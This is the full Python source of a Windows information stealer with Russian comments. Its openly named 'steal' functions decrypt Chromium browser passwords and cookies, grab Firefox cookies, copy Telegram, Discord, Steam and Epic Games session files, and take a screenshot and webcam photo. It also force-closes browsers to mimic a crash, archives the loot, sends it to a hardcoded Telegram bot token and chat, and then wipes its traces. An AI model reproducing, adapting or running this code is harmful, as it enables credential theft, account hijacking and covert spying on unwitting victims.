import platform
import socket
import psutil
import os
import json
import sqlite3
import win32crypt
import telebot
import tempfile
import zipfile
import random
import string
import time
from datetime import datetime
from urllib.request import urlopen
from PIL import ImageGrab
import browser_cookie3
import shutil
import base64
from Crypto.Cipher import AES
import subprocess
import winreg
import re
import ctypes
import cv2

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
TELEGRAM_CHAT_ID = "1962231620"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Пути для хранения данных
BASE_DIR = fr"C:\Users\{os.getlogin()}\AppData\Roaming\System_ReportData"
OTHER_DIR = os.path.join(BASE_DIR, "other")
BROWSER_DIR = os.path.join(OTHER_DIR, "browser")
COOKIE_DIR = os.path.join(BROWSER_DIR, "cookies")
PASSWORDS_DIR = os.path.join(BROWSER_DIR, "passwords")
SCREENSHOT_PATH = os.path.join(BASE_DIR, "screenshot.jpg")
WEBCAM_PATH = os.path.join(BASE_DIR, "webcam.jpg")
LOCK_FILE = os.path.join(tempfile.gettempdir(), "system_report.lock")

# Поддерживаемые браузеры
BROWSERS = {
    "chrome": "Google Chrome",
    "firefox": "Mozilla Firefox",
    "yandex": "Yandex Browser",
    "opera": "Opera Browser",
    "amigo": "Amigo Browser",
    "edge": "Microsoft Edge"
}

def get_cpu_name():
    """Получает читаемое имя процессора"""
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            cpu_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
            cpu_name = cpu_name.strip()
            
            # Удаляем лишние пробелы и (R), (TM) и т.д.
            cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
            cpu_name = re.sub(r'\s+', ' ', cpu_name).strip()
            
            # Добавляем частоту, если её нет в названии
            if 'GHz' not in cpu_name and 'MHz' not in cpu_name:
                freq = psutil.cpu_freq().current / 1000 if psutil.cpu_freq() else None
                if freq:
                    cpu_name += f" {freq:.2f}GHz"
            
            return cpu_name
        else:
            # Для Linux/Mac
            with open('/proc/cpuinfo') as f:
                for line in f:
                    if 'model name' in line:
                        return line.split(':')[1].strip()
    except:
        pass
    
    # Резервный вариант
    cpu_info = platform.processor()
    if 'AMD' in cpu_info or 'Intel' in cpu_info:
        return cpu_info
    return "Unknown CPU"

def stealthy_kill_browser(browser_name):
    """Скрытное закрытие браузера (имитация сбоя)"""
    process_map = {
        "chrome": "chrome.exe",
        "firefox": "firefox.exe",
        "opera": "opera.exe",
        "yandex": "browser.exe",
        "amigo": "browser.exe",
        "edge": "msedge.exe"
    }
    
    target_process = process_map.get(browser_name)
    if not target_process:
        return False
    
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == target_process.lower():
                try:
                    # Мягкое завершение через WM_CLOSE
                    hwnd = ctypes.windll.user32.FindWindowW(None, f"{BROWSERS[browser_name]}") 
                    if hwnd != 0:
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)  # WM_CLOSE
                    
                    # Если не закрылось, имитируем сбой
                    time.sleep(2)
                    if proc.is_running():
                        proc.terminate()
                except:
                    pass
        
        return True
    except Exception as e:
        print(f"Ошибка при скрытном закрытии браузера: {e}")
        return False

def capture_webcam():
    """Делает снимок с веб-камеры, если она доступна"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False
        
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite(WEBCAM_PATH, frame)
            return True
    except:
        pass
    return False

def steal_steam_data():
    """Крадет данные Steam"""
    steam_dir = os.path.join(OTHER_DIR, "Steam")
    os.makedirs(steam_dir, exist_ok=True)
    steam_paths = [
        os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config"),
        os.path.join(os.getenv("APPDATA"), "Steam"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Steam")
    ]
    
    stolen_data = []
    for path in steam_paths:
        if os.path.exists(path):
            try:
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith(("vdf", "ssfn", "config")):
                            src = os.path.join(root, file)
                            rel_path = os.path.relpath(src, path)
                            dst = os.path.join(steam_dir, rel_path)
                            os.makedirs(os.path.dirname(dst), exist_ok=True)
                            shutil.copy2(src, dst)
                            stolen_data.append(rel_path)
            except Exception as e:
                print(f"Ошибка при краже данных Steam: {e}")
    
    with open(os.path.join(steam_dir, "file_list.json"), "w") as f:
        json.dump(stolen_data, f)

def steal_epic_games_data():
    """Крадет данные Epic Games"""
    epic_dir = os.path.join(OTHER_DIR, "EpicGames")
    os.makedirs(epic_dir, exist_ok=True)
    epic_paths = [
        os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved"),
        os.path.join(os.getenv("APPDATA"), "Epic")
    ]
    
    stolen_data = []
    for path in epic_paths:
        if os.path.exists(path):
            try:
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith(("ini", "dat", "log", "json")):
                            src = os.path.join(root, file)
                            rel_path = os.path.relpath(src, path)
                            dst = os.path.join(epic_dir, rel_path)
                            os.makedirs(os.path.dirname(dst), exist_ok=True)
                            shutil.copy2(src, dst)
                            stolen_data.append(rel_path)
            except Exception as e:
                print(f"Ошибка при краже данных Epic Games: {e}")
    
    with open(os.path.join(epic_dir, "file_list.json"), "w") as f:
        json.dump(stolen_data, f)

def steal_telegram_data():
    """Крадет данные Telegram"""
    telegram_dir = os.path.join(OTHER_DIR, "Telegram")
    os.makedirs(telegram_dir, exist_ok=True)
    telegram_paths = [
        os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Telegram Desktop")
    ]
    
    stolen_data = []
    for path in telegram_paths:
        if os.path.exists(path):
            try:
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith(("map", "s")):  # Конфиги и сессии
                            src = os.path.join(root, file)
                            rel_path = os.path.relpath(src, path)
                            dst = os.path.join(telegram_dir, rel_path)
                            os.makedirs(os.path.dirname(dst), exist_ok=True)
                            shutil.copy2(src, dst)
                            stolen_data.append(rel_path)
            except Exception as e:
                print(f"Ошибка при краже данных Telegram: {e}")
    
    with open(os.path.join(telegram_dir, "file_list.json"), "w") as f:
        json.dump(stolen_data, f)

def steal_discord_data():
    """Крадет данные Discord"""
    discord_dir = os.path.join(OTHER_DIR, "Discord")
    os.makedirs(discord_dir, exist_ok=True)
    discord_paths = [
        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Discord")
    ]
    
    stolen_data = []
    for path in discord_paths:
        if os.path.exists(path):
            try:
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith((".ldb", ".log", ".manifest")):
                            src = os.path.join(root, file)
                            rel_path = os.path.relpath(src, path)
                            dst = os.path.join(discord_dir, rel_path)
                            os.makedirs(os.path.dirname(dst), exist_ok=True)
                            shutil.copy2(src, dst)
                            stolen_data.append(rel_path)
            except Exception as e:
                print(f"Ошибка при краже данных Discord: {e}")
    
    with open(os.path.join(discord_dir, "file_list.json"), "w") as f:
        json.dump(stolen_data, f)

def get_encryption_key(browser_path):
    """Получает ключ шифрования для браузеров на основе Chromium"""
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Убираем DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Ошибка получения ключа {browser_path}: {e}")
        return None

def decrypt_password(password, key):
    """Расшифровывает пароль"""
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def steal_chrome_passwords(browser_name, profile_path):
    """Крадет пароли из браузеров на основе Chromium"""
    try:
        key = get_encryption_key(profile_path)
        login_db = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(login_db):
            return []
        
        # Создаем временную копию файла паролей
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_pass_{browser_name}_{random.randint(1000,9999)}.db")
        shutil.copy2(login_db, temp_db)
        
        passwords = []
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for item in cursor.fetchall():
            try:
                decrypted_pass = decrypt_password(item[2], key)
                if decrypted_pass:
                    passwords.append({
                        'url': item[0],
                        'username': item[1],
                        'password': decrypted_pass
                    })
            except:
                continue
        
        conn.close()
        os.remove(temp_db)
        return passwords
    except Exception as e:
        print(f"Ошибка при краже паролей {browser_name}: {e}")
        return []

def steal_chromium_cookies(browser_name, profile_path):
    """Крадет куки из браузеров на основе Chromium"""
    try:
        key = get_encryption_key(profile_path)
        cookie_db = os.path.join(profile_path, "Network", "Cookies")
        
        if not os.path.exists(cookie_db):
            return []
        
        # Создаем временную копию файла куки
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db")
        shutil.copy2(cookie_db, temp_db)
        
        cookies = []
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
        
        for item in cursor.fetchall():
            try:
                # Используем encrypted_value если обычное значение пустое
                cookie_value = item[2] if item[2] else item[6]
                
                if isinstance(cookie_value, bytes):
                    decrypted_value = decrypt_password(cookie_value, key)
                else:
                    decrypted_value = cookie_value
                
                cookies.append({
                    'host': item[0],
                    'name': item[1],
                    'value': decrypted_value,
                    'path': item[3],
                    'expires': item[4],
                    'secure': bool(item[5])
                })
            except Exception as e:
                continue
        
        conn.close()
        os.remove(temp_db)
        return cookies
    except Exception as e:
        print(f"Ошибка при краже куки {browser_name}: {e}")
        return []

def steal_passwords():
    """Крадет пароли из всех доступных браузеров"""
    os.makedirs(PASSWORDS_DIR, exist_ok=True)
    
    # Пути к профилям браузеров
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    browser_paths = {
        "chrome": os.path.join(appdata, "Google", "Chrome", "User Data", "Default"),
        "edge": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default"),
        "opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "yandex": os.path.join(appdata, "Yandex", "YandexBrowser", "User Data", "Default"),
        "amigo": os.path.join(appdata, "Amigo", "User Data", "Default")
    }
    
    for browser_name, display_name in BROWSERS.items():
        try:
            passwords = []
            
            if browser_name == "firefox":
                # Для Firefox оставим заглушку
                pass
            elif browser_name in browser_paths:
                path = browser_paths[browser_name]
                if os.path.exists(path):
                    stealthy_kill_browser(browser_name)
                    time.sleep(1)
                    passwords = steal_chrome_passwords(browser_name, path)
            
            # Сохраняем пароли
            if passwords:
                password_file = os.path.join(PASSWORDS_DIR, f"{display_name}_Passwords.json")
                with open(password_file, 'w', encoding='utf-8') as f:
                    json.dump(passwords, f, indent=4, ensure_ascii=False)
                    
        except Exception as e:
            print(f"Общая ошибка при краже паролей {browser_name}: {e}")

def steal_cookies():
    """Крадет куки из всех доступных браузеров"""
    os.makedirs(COOKIE_DIR, exist_ok=True)
    
    # Пути к профилям браузеров
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    browser_paths = {
        "chrome": os.path.join(appdata, "Google", "Chrome", "User Data", "Default"),
        "edge": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default"),
        "opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "yandex": os.path.join(appdata, "Yandex", "YandexBrowser", "User Data", "Default"),
        "amigo": os.path.join(appdata, "Amigo", "User Data", "Default")
    }
    
    for browser_name, display_name in BROWSERS.items():
        try:
            cookies = []
            
            if browser_name == "firefox":
                # Для Firefox используем browser_cookie3
                try:
                    jar = browser_cookie3.firefox()
                    for cookie in jar:
                        cookies.append({
                            'host': cookie.domain,
                            'name': cookie.name,
                            'value': cookie.value,
                            'path': cookie.path,
                            'expires': cookie.expires,
                            'secure': cookie.secure
                        })
                except:
                    pass
            elif browser_name in browser_paths:
                path = browser_paths[browser_name]
                if os.path.exists(path):
                    stealthy_kill_browser(browser_name)
                    time.sleep(1)
                    cookies = steal_chromium_cookies(browser_name, path)
            
            # Сохраняем куки
            if cookies:
                cookie_file = os.path.join(COOKIE_DIR, f"{display_name}_Cookies.json")
                with open(cookie_file, 'w', encoding='utf-8') as f:
                    json.dump(cookies, f, indent=4, ensure_ascii=False)
                    
        except Exception as e:
            print(f"Общая ошибка при краже куки {browser_name}: {e}")

def get_ipinfo():
    """Получает информацию о IP"""
    try:
        response = urlopen('http://ipinfo.io/json')
        return json.load(response)
    except:
        return {"ip": "N/A", "org": "N/A", "city": "N/A", "region": "N/A", "country": "N/A"}

def get_system_info():
    """Собирает полную системную информацию"""
    ipinfo = get_ipinfo()
    
    # Получаем информацию о CPU
    cpu_info = {
        "model": get_cpu_name(),
        "physical_cores": psutil.cpu_count(logical=False),
        "logical_cores": psutil.cpu_count(logical=True),
        "max_frequency": psutil.cpu_freq().max if hasattr(psutil, "cpu_freq") and psutil.cpu_freq() else "N/A",
        "usage": psutil.cpu_percent(interval=1)
    }
    
    # Получаем информацию о дисках
    drives = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            drives.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "fstype": part.fstype,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent_used": usage.percent
            })
        except:
            continue
    
    # Получаем сетевую информацию
    network_info = {
        "public_ip": ipinfo.get("ip", "N/A"),
        "isp": ipinfo.get("org", "N/A"),
        "location": f"{ipinfo.get('city', 'N/A')}, {ipinfo.get('region', 'N/A')}, {ipinfo.get('country', 'N/A')}",
        "connections": []
    }
    
    return {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "system": {
            "os": platform.system(),
            "version": platform.version(),
            "release": platform.release(),
            "architecture": platform.architecture()[0],
            "hostname": socket.gethostname(),
            "username": os.getlogin()
        },
        "hardware": {
            "cpu": cpu_info,
            "memory": {
                "total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                "available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
                "used_percent": psutil.virtual_memory().percent
            },
            "disks": drives
        },
        "network": network_info,
        "software": {
            "python_version": platform.python_version()
        }
    }

def take_screenshot():
    """Делает скриншот рабочего стола"""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(SCREENSHOT_PATH, "JPEG", quality=90)
        return True
    except Exception as e:
        print(f"Ошибка создания скриншота: {e}")
        return False

def create_zip():
    """Создает ZIP-архив с данными"""
    zip_name = f"system_data_{random.randint(1000,9999)}.zip"
    zip_path = os.path.join(tempfile.gettempdir(), zip_name)
    
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(BASE_DIR):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, BASE_DIR)
                    zipf.write(file_path, arcname)
        return zip_path
    except Exception as e:
        print(f"Ошибка создания архива: {e}")
        return None

def send_to_telegram(zip_path):
    """Отправляет данные в Telegram в правильной последовательности"""
    try:
        # 1. Отправляем скриншот (если есть)
        if os.path.exists(SCREENSHOT_PATH):
            with open(SCREENSHOT_PATH, 'rb') as photo:
                bot.send_photo(
                    chat_id=TELEGRAM_CHAT_ID,
                    photo=photo,
                    caption="🖥️ Скриншот рабочего стола"
                )
            time.sleep(1)

        # 2. Отправляем снимок с веб-камеры (если есть)
        if os.path.exists(WEBCAM_PATH):
            with open(WEBCAM_PATH, 'rb') as photo:
                bot.send_photo(
                    chat_id=TELEGRAM_CHAT_ID,
                    photo=photo,
                    caption="📸 Снимок с веб-камеры"
                )
            time.sleep(1)

        # 3. Отправляем краткие сведения о системе
        sys_info = get_system_info()
        cpu_name = get_cpu_name()
        cpu_cores = f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)} (физич./логич.)"
        cpu_usage = f"{psutil.cpu_percent(interval=1)}%"
        
        summary = (
            "🚨 *СИСТЕМНЫЙ ОТЧЕТ* 🚨\n"
            f"• *ОС:* `{sys_info['system']['os']} {sys_info['system']['version']}`\n"
            f"• *Пользователь:* `{sys_info['system']['username']}`\n"
            f"• *Процессор:* `{cpu_name}`\n"
            f"• *Ядра:* `{cpu_cores}`\n"
            f"• *Нагрузка:* `{cpu_usage}`\n"
            f"• *ОЗУ:* `{sys_info['hardware']['memory']['total_gb']} GB`\n"
            f"• *IP:* `{sys_info['network']['public_ip']}`\n"
            f"• *Местоположение:* `{sys_info['network']['location']}`"
        )
        bot.send_message(TELEGRAM_CHAT_ID, summary, parse_mode='Markdown')
        time.sleep(1)

        # 4. Проверяем размер архива перед отправкой
        if not zip_path or not os.path.exists(zip_path):
            bot.send_message(TELEGRAM_CHAT_ID, "❌ Ошибка: архив не создан")
            return False
        
        zip_size = os.path.getsize(zip_path) / (1024 * 1024)  # Размер в МБ
        
        if zip_size > 50:
            bot.send_message(
                TELEGRAM_CHAT_ID,
                f"❌ Размер архива превышает 50 МБ ({zip_size:.2f} МБ). "
                "Данные не будут отправлены."
            )
            return False

        # 5. Отправляем архив с данными
        with open(zip_path, 'rb') as f:
            bot.send_document(
                chat_id=TELEGRAM_CHAT_ID,
                document=f,
                caption="📦 Полные данные системы, куки, пароли и данные приложений",
                timeout=120
            )
        return True
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False

def cleanup():
    """Очищает следы"""
    try:
        shutil.rmtree(BASE_DIR, ignore_errors=True)
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
            
        # Удаляем временные файлы
        for file in os.listdir(tempfile.gettempdir()):
            if file.startswith("temp_") and file.endswith(".db"):
                try:
                    os.remove(os.path.join(tempfile.gettempdir(), file))
                except:
                    pass
    except:
        pass

def main_workflow():
    """Основной рабочий процесс"""
    # Создаем структуру папок
    os.makedirs(BASE_DIR, exist_ok=True)
    os.makedirs(OTHER_DIR, exist_ok=True)
    os.makedirs(BROWSER_DIR, exist_ok=True)
    os.makedirs(COOKIE_DIR, exist_ok=True)
    os.makedirs(PASSWORDS_DIR, exist_ok=True)
    
    # Собираем системную информацию
    print("[+] Сбор системной информации")
    sys_info = get_system_info()
    with open(os.path.join(BASE_DIR, "system_report.json"), 'w', encoding='utf-8') as f:
        json.dump(sys_info, f, indent=4, ensure_ascii=False)
    
    # Крадем куки
    print("[+] Кража cookies браузеров")
    steal_cookies()
    
    # Крадем пароли
    print("[+] Кража паролей браузеров")
    steal_passwords()
    
    # Крадем данные приложений
    print("[+] Кража данных приложений")
    steal_telegram_data()
    steal_discord_data()
    steal_steam_data()
    steal_epic_games_data()
    
    # Скриншот
    print("[+] Создание скриншота")
    take_screenshot()
    
    # Снимок с веб-камеры
    print("[+] Проверка веб-камеры")
    if capture_webcam():
        print("[+] Снимок с веб-камеры сделан")
    
    # Упаковываем и отправляем
    print("[+] Создание архива")
    zip_file = create_zip()
    
    if zip_file:
        print("[+] Отправка в Telegram")
        send_to_telegram(zip_file)
    else:
        bot.send_message(TELEGRAM_CHAT_ID, "❌ Ошибка: не удалось создать архив")

if __name__ == "__main__":
    # Проверка блокировки
    if os.path.exists(LOCK_FILE):
        exit()
    
    try:
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
    except:
        exit()
    
    try:
        main_workflow()
        print("[+] Готово")
    except Exception as e:
        print(f"!!! Критическая ошибка: {e}")
        try:
            bot.send_message(TELEGRAM_CHAT_ID, f"❌ Критическая ошибка: {str(e)}")
        except:
            pass
    finally:
        cleanup()
